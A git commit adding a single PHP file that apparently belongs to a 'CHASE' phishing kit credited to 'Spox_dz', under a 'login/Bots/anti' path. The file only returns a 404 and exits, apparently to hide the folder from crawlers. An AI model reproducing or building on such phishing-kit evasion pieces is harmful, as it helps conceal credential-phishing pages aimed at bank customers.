55aa1c8927f9facf6b9f23d0e3226c0ef814dfdb
Stefan Pejcic <stefan@pejcic.rs>
2022-08-05 10:44:09 +0200

    Add files via upload

---
+++ 04.08.2022/login/Bots/anti/out/Crawler/raw/index.php
@@ -0,0 +1,19 @@
+<?php
+/**
+ * DO NOT SELL THIS SCRIPT ! 
+ * DO NOT CHANGE COPYRIGHT !
+ * CHASE -
+ * version 1.0
+ * Https://facebook.com/hackeeeed.html
+ * icq+teleg = @spoxcoder
+ 
+###############################################
+#$            C0d3d by Spox_dz               $#
+#$   Recording doesn't  make you a Coder     $#
+#$          Copyright 2019 CHASE             $#
+###############################################
+
+**/
+header("HTTP/1.0 404 Not Found");
+exit();
+?>
